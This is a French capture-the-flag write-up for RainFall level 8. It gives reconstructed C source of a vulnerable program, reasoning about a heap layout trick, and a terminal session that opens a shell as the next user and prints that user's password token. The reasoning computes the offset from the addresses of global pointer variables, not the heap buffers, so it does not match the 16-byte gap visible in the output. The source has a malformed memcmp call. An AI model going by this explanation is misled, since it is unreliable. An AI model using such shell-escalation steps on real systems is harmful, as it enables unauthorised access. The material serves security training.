## Level 8

pass : `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

## Source :

```c
#include <stdio.h>
#include <string.h>

char	*auth = NULL;  // 0x08049aac
char	*service = NULL;  // 0x08049ab0

int	main() {  // 0x08048564
	char	buf[128];  // esp+0x20 / size = 0xa0 - 0x20

	while (1) {
		printf("%p, %p \n", auth, service);
		if (fgets(buf, 128, stdin) == 0)
			break;
		if (memcmp(buf, "auth ", 5) == 0) {
			auth = malloc(4);
			*auth = '\0';
			if (strlen(&buf[5]) <= 30) {
				strcpy(auth, &buf[5]);
			}
		}
		if (memcmp(buf, "reset", 5) == 0) {
			free(auth);
		}
		if (memcmp(buf, "service", 7) == 0) {
			service = strdup(&buf[7]);
		}
		if (memcmp(buf, "login") == 0) {
			if (auth[32] == '\0') {
				system("/bin/sh");
			} else {
				fwrite("Password:\n", 1, 10, stdout);
			}
		}
	}
	return (0);
}
```

## Recherche :

Pour que l'on lance `system("/bin/sh");`, il faut que `auth[32] == '\0'`, mais comme on ne peut écrire que 30 caractères sur `auth`, on va passer par le fait que les deux variables `auth` et `service` sont contingentes, `0x08049ab0 - 0x08049aac = 4`, donc `auth[32] == service[28]`. On va donc mettre dans `service` une chaine de 28 caractères, qui sera directement complété par `\0` avec `strdup()`.
Enfin, un coup de `login` et on est bon.

## Exploit

```shell
level8@RainFall:~$ ./level8
(nil), (nil)
auth
0x804a008, (nil)
service 0123456789012345678901234567
0x804a008, 0x804a018
login
$ whoami
level9
$ cd ../level9
$ cat .pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```
